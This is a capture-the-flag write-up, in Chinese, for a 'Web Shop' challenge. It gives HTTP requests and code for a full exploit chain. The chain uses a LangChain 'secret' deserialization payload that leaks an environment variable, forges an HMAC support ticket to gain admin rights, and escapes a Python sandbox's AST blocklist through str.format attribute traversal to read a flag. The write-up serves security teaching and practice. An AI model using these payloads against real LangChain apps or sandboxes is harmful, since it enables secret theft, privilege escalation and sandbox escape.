# Web Shop Writeup

## 0. 总体利用链

```text
注册登录
  -> 敲木鱼 10 次，把 50 金币提升到 60 金币
  -> 购买 Support Debug Bundle
  -> 下载 support_ticket.py
  -> 得知 SHOP_SUPPORT_SEED 和客服票据签发算法
  -> 观察聊天 presence metadata，确认后端使用 LangChain 序列化/反序列化
  -> 构造 type=secret 的 LangChain metadata
  -> 通过 /api/chat/messages 写入并通过 /api/chat/messages 读取历史触发 loads()
  -> 泄露 SHOP_SUPPORT_SEED
  -> 用 seed 给当前用户签发当日 support ticket
  -> 调用 Bot /login 提权为 support_admin
  -> 调用 /api/rules/run
  -> 利用 str.format field traversal 绕过 AST 静态黑名单
  -> 读取 generator frame locals 中的 shipment_manifest
  -> 得到 flag
```

---

## 1. 注册登录

注册一个新账号：

```http
POST /api/auth/register
Content-Type: application/json

{
  "username": "player001",
  "password": "Strong_123456",
  "confirmPassword": "Strong_123456"
}
```

响应中得到 token 和用户信息：

```json
{
  "token": "...",
  "user": {
    "id": 1,
    "username": "player001",
    "coins": 50,
    "role": "customer",
    "woodfishCount": 0
  }
}
```

后续请求带：

```http
Authorization: Bearer <token>
```

---

## 2. 探索商店和木鱼

查询商品：

```http
GET /api/shop/products
Authorization: Bearer <token>
```

能看到一个价格为 60 金币的商品：

```text
Support Debug Bundle
```

新用户初始金币为 50。木鱼接口最多可以额外获得 10 金币：

```http
POST /api/woodfish/knock
Authorization: Bearer <token>
Content-Type: application/json

{}
```

调用 10 次后：

```text
coins = 60
woodfishCount = 10
```

---

## 3. 购买 Support Debug Bundle 并下载脚本

购买价格为 60 的调试包：

```http
POST /api/shop/buy
Authorization: Bearer <token>
Content-Type: application/json

{
  "productId": 2
}
```

购买成功后响应中有下载路径：

```json
{
  "download": "/api/shop/download/support-ticket"
}
```

下载：

```http
GET /api/shop/download/support-ticket
Authorization: Bearer <token>
```

得到 `support_ticket.py`。核心逻辑：

```python
SUPPORT_SEED_ENV = "SHOP_SUPPORT_SEED"


def issue_support_ticket(user: dict[str, Any]) -> str:
    seed = os.environ.get(SUPPORT_SEED_ENV, "local-support-seed")
    today = datetime.now(timezone.utc).strftime("%Y%m%d")
    message = f"support-login:{user['id']}:{user['username']}:{today}"
    digest = hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()
    return digest[:12]


def verify_support_ticket(user: dict[str, Any], provided: str) -> bool:
    expected = issue_support_ticket(user)
    return secrets.compare_digest(provided, expected)
```

可知：

1. 需要泄露的环境变量名是：

```text
SHOP_SUPPORT_SEED
```

2. support admin 登录票据算法为：

```text
hmac_sha256(
  key = SHOP_SUPPORT_SEED,
  msg = "support-login:<user_id>:<username>:<UTC date YYYYMMDD>"
)[:12]
```

---

## 4. 观察聊天 presence 包

进入聊天页面后，前端会定时调用：

```http
POST /api/chat/presence
Authorization: Bearer <token>
Content-Type: application/json
```

其中 metadata 类似：

```json
{
  "content": "alive",
  "metadata": {
    "source": "asset-probe",
    "client": "web-shop",
    "ts": 1780000000000,
    "messages": [
      {
        "lc": 1,
        "type": "constructor",
        "id": ["langchain_core", "messages", "SystemMessage"],
        "kwargs": {
          "content": "Support replay context initialized."
        }
      }
    ]
  }
}
```

关键格式：

```json
{
  "lc": 1,
  "type": "constructor",
  "id": ["langchain_core", "messages", "SystemMessage"],
  "kwargs": {}
}
```

这是 LangChain serialized object 的格式。后端对聊天 metadata 有序列化/恢复逻辑。

LangChain 还支持 `secret` 类型：

```json
{
  "lc": 1,
  "type": "secret",
  "id": ["ENV_NAME"]
}
```

当 `loads()` 恢复 secret 时，会尝试从环境变量中取值。

---

## 5. 泄露 SHOP_SUPPORT_SEED

普通聊天消息会将 metadata 存入数据库。读取历史聊天记录时，后端会恢复历史 metadata。

构造一条带 `secret` 的消息：

```http
POST /api/chat/messages
Authorization: Bearer <token>
Content-Type: application/json

{
  "content": "hello",
  "metadata": {
    "client": "web",
    "probe": {
      "lc": 1,
      "type": "secret",
      "id": ["SHOP_SUPPORT_SEED"]
    }
  }
}
```

然后读取历史消息：

```http
GET /api/chat/messages
Authorization: Bearer <token>
```

响应中当前用户自己的这条消息会带回恢复后的 metadata：

```json
{
  "messages": [
    {
      "username": "player001",
      "content": "hello",
      "metadata": {
        "client": "web",
        "probe": "<leaked SHOP_SUPPORT_SEED>"
      }
    }
  ]
}
```

记录：

```text
SHOP_SUPPORT_SEED = <leaked seed>
```

公共环境中，聊天历史查询只返回：

```text
系统预置消息 user_id = 0
当前用户自己的消息
```

所以不能直接看到其他选手的 payload 或泄露值。

---

## 6. 签发 support admin 登录票据

根据 `support_ticket.py` 算法，为当前用户签发当日 ticket：

```python
import hashlib
import hmac
from datetime import datetime, timezone

seed = "<leaked SHOP_SUPPORT_SEED>"
user_id = 1
username = "player001"

today = datetime.now(timezone.utc).strftime("%Y%m%d")
message = f"support-login:{user_id}:{username}:{today}"
ticket = hmac.new(seed.encode(), message.encode(), hashlib.sha256).hexdigest()[:12]
print(ticket)
```

注意这里日期使用 UTC 日期，不是本地时区日期。

---

## 7. Bot 登录 support_admin

向 Bot 发送：

```http
POST /api/bot/chat
Authorization: Bearer <token>
Content-Type: application/json

{
  "message": "/login <ticket>"
}
```

成功后响应中的用户 role 变为：

```text
support_admin
```

也可以用：

```http
GET /api/auth/me
Authorization: Bearer <token>
```

确认：

```json
{
  "user": {
    "role": "support_admin"
  }
}
```

---

## 8. 进入 Rule Lab

提权后可调用：

```http
POST /api/rules/run
Authorization: Bearer <token>
Content-Type: application/json

{
  "code": "result = 1 + 1"
}
```

正常响应：

```json
{
  "ok": true,
  "result": 2,
  "elapsedMs": 0
}
```

---

## 9. Rule Lab 沙箱分析

Rule Lab 暴露了业务函数：

```python
iter_preview_items()
```

正常用法：

```python
items = []
for item in iter_preview_items():
    items.append(item)
result = items
```

沙箱会禁止很多直接逃逸写法，例如：

```python
import os
open("/app/private/flag.txt").read()
```

也会禁止直接访问生成器 frame：

```python
g = iter_preview_items()
next(g)
result = g.gi_frame.f_locals
```

会被拒绝：

```text
forbidden attribute: gi_frame
forbidden attribute: f_locals
```

沙箱核心逻辑中有一个生成器，大致等价于：

```python
def iter_preview_items():
    shipment_manifest = load_manifest()
    for item in preview_items:
        yield item
```

其中：

```python
shipment_manifest
```

就是私有发货预览文件内容。部署环境中该文件是 flag。

沙箱通过 AST 黑名单检测属性名和字符串常量中的敏感片段：

```text
gi_frame
f_locals
f_globals
...
```

但是 Python 的 `str.format()` field name 会在格式化阶段执行属性访问和 item 访问。field 字符串可以通过字符串拼接产生，从而避开 AST 对完整敏感字符串的静态检测。

---

## 10. 沙箱逃逸 payload

提交代码：

```python
g = iter_preview_items()
next(g)
field = "{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
result = field.format(g)
```

对应请求：

```http
POST /api/rules/run
Authorization: Bearer <token>
Content-Type: application/json

{
  "code": "g = iter_preview_items()\nnext(g)\nfield = \"{0.gi_\" + \"frame.f_\" + \"locals[shipment_manifest]}\"\nresult = field.format(g)"
}
```

原理：

1. `g = iter_preview_items()` 创建生成器。
2. `next(g)` 让生成器运行到第一个 `yield`，此时 `shipment_manifest` 已存在于生成器 frame locals 中。
3. 不能直接写 `g.gi_frame.f_locals`，因为 AST 会检查属性名并拒绝。
4. 构造 format field：

```python
"{0.gi_" + "frame.f_" + "locals[shipment_manifest]}"
```

拼接后是：

```python
"{0.gi_frame.f_locals[shipment_manifest]}"
```

5. `field.format(g)` 在 format field 解析阶段执行：

```python
g.gi_frame.f_locals["shipment_manifest"]
```

6. 得到 flag 内容。

成功响应：

```json
{
  "ok": true,
  "result": "SCTF{...}",
  "elapsedMs": 0
}
```
